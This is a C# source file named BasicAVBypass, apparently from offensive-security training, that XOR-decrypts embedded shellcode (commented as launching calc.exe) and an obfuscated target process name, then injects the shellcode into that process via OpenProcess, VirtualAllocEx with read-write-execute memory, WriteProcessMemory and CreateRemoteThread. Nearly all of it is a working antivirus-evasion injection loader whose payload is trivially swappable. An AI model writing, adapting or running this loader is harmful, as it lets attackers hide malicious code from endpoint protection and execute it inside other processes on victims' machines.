using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BasicAVBypass
{
    internal class Program
    {
        // define and hardcoded key - todo: change with something you can get from the environment 
        private static readonly byte[] key = Encoding.ASCII.GetBytes("passkey");

        // it's like RemoteShellInject, with xor encryption

        // from pinvoke.net
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }


        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum ProcessAccessFlags
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        static void Main(string[] args)
        {

            // encrypted shellcode for calc.exe with EXITFUNC=thread - use XORingStuff
            byte[] shellcode = new byte[296] {
                0x8c, 0x29, 0xf0, 0x97, 0x9b, 0x8d, 0xb9, 0x70, 0x61, 0x73, 0x32, 0x3a, 0x24, 0x29, 0x22,
                0x30, 0x25, 0x3b, 0x5a, 0xb7, 0x1c, 0x38, 0xea, 0x21, 0x13, 0x23, 0xee, 0x2b, 0x68, 0x29,
                0xf8, 0x21, 0x4b, 0x2d, 0xf2, 0x02, 0x31, 0x3b, 0x7c, 0xdc, 0x2f, 0x33, 0x3d, 0x50, 0xba,
                0x3b, 0x5a, 0xa5, 0xd5, 0x4c, 0x00, 0x0f, 0x71, 0x47, 0x45, 0x38, 0xb1, 0xa8, 0x7e, 0x32,
                0x6a, 0xa4, 0x9b, 0x9d, 0x33, 0x32, 0x22, 0x23, 0xee, 0x2b, 0x50, 0xea, 0x31, 0x4f, 0x23,
                0x64, 0xa9, 0xfb, 0xe1, 0xfb, 0x73, 0x6b, 0x65, 0x31, 0xf5, 0xa1, 0x07, 0x14, 0x23, 0x64,
                0xa9, 0x20, 0xea, 0x3b, 0x6b, 0x2f, 0xee, 0x39, 0x50, 0x28, 0x72, 0xa3, 0x88, 0x33, 0x31,
                0x8f, 0xa8, 0x32, 0xf8, 0x5f, 0xed, 0x31, 0x71, 0xb7, 0x3e, 0x42, 0xa2, 0x2d, 0x48, 0xb0,
                0xcd, 0x32, 0xb2, 0xa2, 0x68, 0x38, 0x71, 0xa0, 0x4b, 0x93, 0x1e, 0x94, 0x35, 0x73, 0x2d,
                0x57, 0x7b, 0x2e, 0x5c, 0xa8, 0x05, 0xb9, 0x2b, 0x37, 0xe0, 0x25, 0x5d, 0x39, 0x60, 0xa3,
                0x15, 0x2a, 0xee, 0x75, 0x38, 0x25, 0xf8, 0x33, 0x77, 0x2c, 0x78, 0xa0, 0x20, 0xf8, 0x77,
                0xe3, 0x2d, 0x78, 0xa0, 0x20, 0x2b, 0x32, 0x33, 0x3b, 0x20, 0x2a, 0x20, 0x2b, 0x32, 0x32,
                0x24, 0x23, 0x38, 0xe2, 0x9f, 0x53, 0x2a, 0x37, 0x86, 0x90, 0x39, 0x32, 0x2a, 0x31, 0x2d,
                0xf2, 0x62, 0x88, 0x24, 0x8c, 0x94, 0x9a, 0x24, 0x38, 0xdb, 0x72, 0x73, 0x6b, 0x65, 0x79,
                0x70, 0x61, 0x73, 0x3b, 0xe6, 0xe8, 0x78, 0x71, 0x61, 0x73, 0x32, 0xd1, 0x54, 0xf2, 0x1f,
                0xe6, 0x8c, 0xa6, 0xd0, 0x85, 0x64, 0x5a, 0x6b, 0x32, 0xc9, 0xcd, 0xf0, 0xc4, 0xed, 0x9e,
                0xa6, 0x3b, 0xe8, 0xa1, 0x51, 0x4c, 0x67, 0x0f, 0x79, 0xeb, 0x9e, 0x99, 0x05, 0x64, 0xc8,
                0x34, 0x78, 0x17, 0x16, 0x1a, 0x61, 0x2a, 0x32, 0xe2, 0xbf, 0x86, 0xa5, 0x22, 0x49, 0x2f,
                0x1c, 0x0c, 0x17, 0x14, 0x0e, 0x04, 0x00, 0x37, 0x16, 0x00, 0x03, 0x15, 0x16, 0x1e, 0x58,
                0x57, 0x25, 0x13, 0x00, 0x1f, 0x10, 0x45, 0x00, 0x01, 0x15, 0x61 };
            
            // crypted processname - use XORingStuff
            byte[] process = new byte[7] { 0x1e, 0x0e, 0x07, 0x16, 0x1b, 0x04, 0x1d };

            Process[] remoteProcess = Process.GetProcessesByName(XorCryptString(process));
            int pid = remoteProcess[0].Id;

            IntPtr procHandle = OpenProcess((uint)ProcessAccessFlags.All, false, (uint)pid);
            IntPtr memAlloc = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, (uint)AllocationType.Commit, (uint)MemoryProtection.ExecuteReadWrite);

            // decrypt shellcode for the injection
            byte[] sc = XorCrypt(shellcode);

            IntPtr bytz;
            WriteProcessMemory(procHandle, memAlloc, sc, sc.Length, out bytz);

            IntPtr lpThreadId;
            IntPtr threadAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAlloc, IntPtr.Zero, 0, out lpThreadId);

            return;
        }

        static byte[] XorCrypt(byte[] bytecode)
        {
            byte[] xoredcode = new byte[bytecode.Length];
            for (int i = 0; i < bytecode.Length; i++)
            {
                xoredcode[i] = (byte)(bytecode[i] ^ key[i % key.Length]);
            }

            return xoredcode;
        }

        static string XorCryptString(byte[] str)
        {
            string xoredcode = "";
            for (int i = 0; i < str.Length; i++)
            {
                xoredcode += (char)(str[i] ^ key[i % key.Length]);
            }
            return xoredcode;
        }
    }
}
